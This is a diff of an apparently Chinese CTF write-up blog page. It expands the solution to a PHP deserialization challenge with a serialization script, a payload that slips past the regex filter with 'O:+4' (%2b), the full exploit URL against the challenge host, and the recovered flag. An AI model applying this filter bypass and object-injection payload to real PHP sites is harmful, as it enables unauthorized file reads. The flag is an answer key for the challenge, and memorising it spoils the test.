@@ -227,11 +227,64 @@ highlight_file(&quot;./index.php&quot;);
 } 
 ?&gt;
 </code></pre><p>很明显的是一道反序列化漏洞的题目，不太明白的读者可以查看一下：<a href="https://xz.aliyun.com/t/3674" target="_blank" rel="noopener">PHP反序列化由浅入深</a></p>
-<p>可以通过反序列化进行任意文件读取，但是正则<code>preg_match(&#39;/[oc]:\d+:/i&#39;,$data,$matches)</code>;waf掉了<code>[oc]:</code>字符:。</p>
-<p>我们发现反序列化payloadO:<code>4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code>中前面的<code>O:4:</code>符合正则的条件，</p>
-<p>因此将其绕过即可。而<code>\d+</code>匹配的是至少一个数字，我们在4前面进行<code>fuzz</code>。发现<code>%2B</code>，也就是<code>+</code>号可以正常反序列化，应该是<code>php</code>解析成了正<code>4。</code></p>
-<p><img src="https://i.imgur.com/I38wX6d.png" alt=""></p>
-<h4 id="ezweb2"><a href="#ezweb2" class="headerlink" title="ezweb2"></a>ezweb2</h4><p>请求包中发现一个<code>user=base64</code>字符串</p>
+<p>在这道题目中自带一个<code>baby</code>类，里面<code>__toString()</code> 中可以用<code>file_get_contents</code>读文件内容：</p>
+<p>可以自己本地来测试一下，获取序列化的对象。</p>
+<pre><code>&lt;?php  
+
+include &#39;flag.php&#39;;
+
+class baby
+
+{   
+
+    public $file;
+
+    function __toString()      
+
+    {          
+
+        if(isset($this-&gt;file))
+
+        {
+
+            $filename = &quot;./{$this-&gt;file}&quot;;        
+
+            if (file_get_contents($filename))         
+
+            {              
+
+                return file_get_contents($filename);
+
+            }
+
+        }     
+
+    }  
+
+}  
+
+
+
+$a = new baby();
+
+$a -&gt; file = &quot;flag.php&quot;;
+
+//echo $a-&gt;__toString(); 
+
+echo serialize($a); 
+?&gt;
+</code></pre><p>得到：</p>
+<pre><code>O:4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}
+</code></pre><p>因为存在过滤出语句</p>
+<pre><code>preg_match(&#39;/[oc]:\d+:/i&#39;,$data,$matches);
+</code></pre><p>所以需要绕过,用加号进行绕过:</p>
+<pre><code>O:+4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}
+</code></pre><p>但如果直接传值的话会，服务器接收到会把加号认为空格，所以要对加号url编码：</p>
+<pre><code>O:%2b4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}
+</code></pre><p>然后直接访问：<br>    <a href="http://101.71.29.5:10007/index.php?data=O:%2b4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}" target="_blank" rel="noopener">http://101.71.29.5:10007/index.php?data=O:%2b4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</a></p>
+<p>访问后查看源代码得到：</p>
+<pre><code>$flag = &#39;flag{ad2328a2c3f0933c053fd3c6f28f6143}&#39;;
+</code></pre><h4 id="ezweb2"><a href="#ezweb2" class="headerlink" title="ezweb2"></a>ezweb2</h4><p>请求包中发现一个<code>user=base64</code>字符串</p>
 <p><img src="https://i.imgur.com/WBw0HNU.png" alt=""></p>
 <p>base64解码之后得到</p>
 <p><img src="https://i.imgur.com/fzuT0wq.png" alt=""></p>
